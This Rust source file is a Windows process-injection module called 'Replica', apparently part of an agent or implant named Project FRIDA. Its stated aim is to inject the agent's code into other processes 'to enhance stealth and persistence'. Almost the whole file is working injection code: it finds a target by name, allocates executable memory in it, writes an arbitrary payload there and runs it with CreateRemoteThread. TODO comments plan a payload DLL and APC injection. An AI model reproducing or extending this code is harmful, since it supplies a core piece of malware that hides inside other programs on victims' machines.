#![cfg(windows)]
//! Process injection module for Project FRIDA.
//!
//! This module, named "Replica," is responsible for injecting the agent's code
//! into other running processes to enhance stealth and persistence. The initial
//! implementation focuses on Windows using the `CreateRemoteThread` technique.

use std::ffi::CStr;
use std::mem;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

/// Finds a process by name and returns its process ID (PID).
pub fn find_process_pid(process_name: &str) -> Option<u32> {
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if snapshot_handle == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
    process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snapshot_handle, &mut process_entry) } == 0 {
        unsafe { CloseHandle(snapshot_handle) };
        return None;
    }

    loop {
        let current_process_name = unsafe {
            CStr::from_ptr(process_entry.szExeFile.as_ptr())
                .to_str()
                .unwrap_or("")
        };

        if current_process_name.eq_ignore_ascii_case(process_name) {
            unsafe { CloseHandle(snapshot_handle) };
            return Some(process_entry.th32ProcessID);
        }

        if unsafe { Process32Next(snapshot_handle, &mut process_entry) } == 0 {
            break;
        }
    }

    unsafe { CloseHandle(snapshot_handle) };
    None
}

/// Injects a payload into a target process specified by its PID.
///
/// # Arguments
/// * `pid` - The Process ID of the target process.
/// * `payload` - A byte slice representing the shellcode or DLL to be injected.
///
/// # Returns
/// A `Result` indicating success or a `String` error message.
pub fn inject(pid: u32, payload: &[u8]) -> Result<(), String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process_handle.is_null() {
            return Err("Failed to open target process".to_string());
        }

        let remote_memory = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_memory.is_null() {
            return Err("Failed to allocate memory in target process".to_string());
        }

        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_handle,
            remote_memory,
            payload.as_ptr() as *const _,
            payload.len(),
            &mut bytes_written,
        );

        if write_result == 0 || bytes_written != payload.len() {
            return Err("Failed to write payload to target process".to_string());
        }

        let mut thread_id = 0;
        let thread_handle = CreateRemoteThread(
            process_handle,
            std::ptr::null_mut(),
            0,
            Some(mem::transmute(remote_memory)),
            remote_memory, // Pass remote_memory as the argument to the thread
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            return Err("Failed to create remote thread in target process".to_string());
        }

        Ok(())
    }
}

// TODO: Implement a robust `find_process_pid` function.
// TODO: Develop or integrate a payload (e.g., a DLL) to be injected.
// TODO: Add support for other injection techniques (e.g., APC injection).
